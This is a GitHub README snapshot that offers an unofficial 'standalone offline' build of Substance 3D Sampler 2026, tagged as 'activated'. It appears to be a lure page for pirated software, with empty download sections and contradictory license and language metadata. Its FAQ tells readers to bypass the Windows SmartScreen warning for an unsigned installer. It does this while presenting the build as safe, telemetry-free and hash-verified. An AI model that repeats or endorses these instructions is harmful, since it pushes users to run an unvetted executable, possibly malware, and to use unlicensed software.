---
title: "swift-atom-89/substance-3d-sampler-desktop"
owner: "swift-atom-89"
name: "substance-3d-sampler-desktop"
fullName: "swift-atom-89/substance-3d-sampler-desktop"
description: "Substance 3D Sampler 2026 standalone bundle with material authoring modules, texture workflow and portable mode for Windows 11"
sourceUrl: "https://github.com/swift-atom-89/substance-3d-sampler-desktop"
stars: 119
forks: 0
language: "C++"
topics: ["adobe-desktop", "adobe-substance-3d-sampler-installer", "adobe-substance-3d-sampler-official", "adobe-substance-3d-sampler-windows", "creative-suite", "substance-3d-sampler", "substance-3d-sampler-2026", "substance-3d-sampler-activated"]
license: "MIT"
homepage: "https://swift-atom-89.github.io/substance-3d-sampler-desktop/"
defaultBranch: "main"
snapshotDate: "2026-11-16"
pushedAt: "2026-11-16T04:51:32Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# 🧊 Substance 3D Sampler 2026: Standalone Offline Build for Windows 11

    


## 📦 Intro

This repository publishes a standalone offline Windows x64 distribution intended for the Substance 3D Sampler workflow, packaged as a self-contained setup for Windows 10 and 11. The distribution bundles the required runtime components and material authoring assets so the workflow can be deployed without repeated retrieval steps. Nothing here is an upstream vendor release; it is a third-party deployment bundle maintained for offline convenience.

The deployment audience is offline-first: air-gapped workstations, bandwidth-constrained labs, and environments where reproducible installs matter more than rolling updates. Because the build ships as a single versioned package, the same artifact can be validated once and deployed across many hosts without drift. This makes the standalone setup practical for teaching labs, content pipelines, and isolated render farms.

The package supports material import and export across common texture formats and bundles the usual authoring components in one distribution surface. A single Substance 3D Sampler on Windows deployment covers both portable and installed modes, selected at launch.

## 01 · ⬇️ Download


  
    
      
      
    
  


  


## 02 · ✨ Features


**📦 Self-contained package**

Ships runtime, libraries and assets in one versioned archive for repeatable deployment.


**🛰️ Offline deployment**

Runs without a network connection after the initial retrieval step completes.


**🧱 Material authoring surface**

Bundled texture, scan and material workflows for the image-based authoring pipeline.


**🔐 SHA256 verification**

Each artifact ships with a published hash so hosts can be validated before rollout.


**💼 Portable mode**

Optional portable layout keeps configuration beside the binary instead of the profile.


**🌐 Multilingual resources**

Bundled language resources cover twelve or more locale packs at install time.


## 03 · ⚙️ How it works

The installer places application binaries under the per-user program directory and writes configuration into the user profile, so no system directories are touched during default deployment. Bundled runtime libraries and asset packs are unpacked into the same tree, keeping the distribution relocatable. A manifest file records the exact component versions shipped with the release.

On first launch the build registers its shell integration entries under the current user hive, writes default preferences, and creates the working project folder. No background service or scheduled task is installed. If portable mode is selected, registration is skipped and configuration is read from a local file beside the executable.

Day to day, the build operates fully offline: it reads and writes project files from the local disk and does not contact network endpoints. Because updates are a manual step, operators control exactly when a host moves to a newer versioned package. This keeps long-running pipelines stable across the deployment window.

Integration is limited to Windows shell entries, optional file associations, and a standard uninstall registry key for the current user. Coexistence with other authoring tools is uncomplicated because the build uses a versioned install directory and does not overwrite shared libraries. Multiple side-by-side versions can be installed under separate directories.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on the x64 architecture only. Both the current release channel and the long-term servicing channel of Windows 11 are supported, along with Windows 10 version 1809 and later. 32-bit targets, ARM hosts and older Windows releases are not supported.

Installation scripts are plain PowerShell and run under PowerShell 5.1 and PowerShell 7 or later. Optional cmdlets used during install are limited to `Get-FileHash`, `Expand-Archive` and `Start-Process`. No external module gallery access is required.

Hardware expectations are modest: the build runs on any recent x64 CPU and is comfortable on systems with typical amounts of memory and free disk space for material libraries. No GPU is strictly required for the installer or the basic authoring surface.

Coexistence is supported: the build installs into a versioned directory and does not modify shared system components. Portable and installed modes can both exist on the same host without conflict. File association entries are user-scoped and can be reassigned at any time.

## 05 · 🔧 Requirements

| Component | Supported | Preferred |
| --- | --- | --- |
| OS | Windows 10 | Windows 11 |
| Shell | PowerShell 5.1+ | PowerShell 7+ |
| Network | Required to download | Stable broadband |
| Privileges | Standard user access | Standard user access |

## 06 · ❓ FAQ

### 🔒 Is this standalone build safe to install on Windows?

> [!CAUTION]
> On first run, Windows SmartScreen may warn for unsigned installers. Click **More info**, then **Run anyway** to continue. The build is an offline setup file; keep your antivirus enabled as usual.

### 🪟 Which Windows versions does the build support?

> [!NOTE]
> The build runs on Windows 10 and Windows 11 on x64. Older Windows releases and 32-bit targets are not supported.

### 📡 Can I use the build offline?

> [!TIP]
> Yes. After install, the build runs without a network connection. Only the initial retrieval step needs internet access.

### 🔄 How do updates work?

> [!NOTE]
> Updates ship as a newer versioned installer; running it over the existing install preserves your projects, templates, and preferences. No separate updater service is required.

### 🗑️ How do I uninstall it on Windows?

> [!WARNING]
> Open Settings, then Apps, then Installed apps, find the entry in the list, and choose Uninstall. Personal project files remain on disk unless you remove them manually.

### ⚙️ What are the technical specifications?

> [!IMPORTANT]
> - **System load:** Light for the installer, moderate during material bake operations.
> - **File formats:** Common image, scan and material formats are supported on import and export.
> - **Portable build:** A portable variant is included and keeps configuration beside the binary.

### 🔐 How do I verify the file with SHA256?

> [!CAUTION]
> Open PowerShell in the folder with the installer and run `Get-FileHash setup.exe -Algorithm SHA256`. Compare the output with the hash published alongside the release. If they do not match, delete the file and fetch it again.

### 🛡️ Does the build require administrator rights?

> [!TIP]
> Standard user access is sufficient for the default install location. Administrator rights are only requested if you choose a system-wide install path during setup.

### 📂 Where does the build place its files?

> [!NOTE]
> By default, the installer uses the per-user program directory for the application and the user profile for configuration. No files are written to Windows system directories.

### 📶 Does the build collect telemetry?

> [!TIP]
> This standalone build does not include telemetry or usage reporting. All processing happens locally on the Windows host.

### 🐛 How do I report an issue?

> [!NOTE]
> Open a new issue on this repository with Windows version, build hash, and the reproduction steps. Include any installer log lines from `%TEMP%` if available.

### ❔ How is this build different from an upstream release?

> [!IMPORTANT]
> This repository publishes a standalone offline distribution packaged by this project. It is independent from any upstream vendor release and is not endorsed by or affiliated with any third-party trademark holder. See the Disclaimer section below for full details.

## 07 · 📜 Disclaimer

**Independent distribution.** This repository publishes a standalone offline build packaged by independent maintainers. It is not an official release from any third-party vendor and is not sponsored, endorsed by, or affiliated with any trademark holder whose product name may be referenced in this documentation.

**Trademarks.** All product names, logos, and brands referenced in this repository are the property of their respective owners. Use of these names does not imply any endorsement. All third-party trademarks remain the property of their respective holders and are used here solely for descriptive and identification purposes, consistent with nominative fair use.

**Educational and research use.** This distribution is published for educational, research, and personal deployment purposes. Users are solely responsible for ensuring their use of any software installed through this build complies with the applicable end-user license agreement of the upstream vendor and with local law.

**No warranty.** This build is provided on an "as is" basis, without warranty of any kind, express or implied. The maintainers make no representation that the build is complete, accurate, up to date, or fit for any particular purpose, and disclaim all liability arising from its use.

**Reporting.** If you are a rights holder and believe content in this repository infringes your rights, please open an issue on the repository or contact the repository owner through the GitHub profile page. Good-faith reports will be reviewed promptly.

**Scope.** This disclaimer applies to the entire contents of this repository, including the README, release artifacts, button graphics, and any linked distribution pages.

## 08 · 📄 License

- The repository contents (README, scripts, button graphics, build artifacts) are released under **CC BY-SA 4.0**.
- You may redistribute and adapt the repository contents, including for commercial purposes, with attribution.
- Attribution requires a link back to this repository and an indication of changes made.
- Derivative works must be released under the same CC BY-SA 4.0 license.
- The license applies ONLY to the contents of this repository, not to any upstream vendor software referenced by it.
- Upstream vendor software remains subject to its own end-user license agreement; this repository does not grant any license to that software.
- This license may be updated over time; the current version is always the one in the `LICENSE` file at the repository root.
- For questions about license scope, open an issue on this repository.

## 09 · 🏷️ Topics


**Substance 3D Sampler** · 3D Material Authoring Workflow · Texture Generation · Scan Processing · Material Layering · Portable Mode · Windows 10 / 11


Related topics: Substance 3D Sampler for Windows 11 · Substance 3D Sampler on Windows 10 · Substance 3D Sampler 2026 · Substance 3D Sampler material workflow · Substance 3D Sampler texture authoring · Substance 3D Sampler scan processing · Substance 3D Sampler portable mode


Dev tags


`python` `powershell` `scripts` `automation` `developer-tools` `open-source` `software-engineering` `windows-deployment` `reproducible-builds` `sha256-verification` `portable-apps` `3d-materials` `texture-authoring` `material-layering` `scan-processing` `pbr-workflow` `substance-3d-sampler` `substance-3d-sampler-2026` `substance-3d-sampler-windows` `substance-3d-sampler-for-windows-10` `substance-3d-sampler-for-windows-11` `substance-3d-sampler-64bit` `substance-3d-sampler-x64` `substance-3d-sampler-portable` `substance-3d-sampler-standalone` `substance-3d-sampler-workflow` `substance-3d-sampler-desktop` `substance-3d-sampler-latest` `substance-3d-sampler-english` `substance-3d-sampler-multilingual` `windows-10` `windows-11` `x64-desktop`


## ⬇️ Download
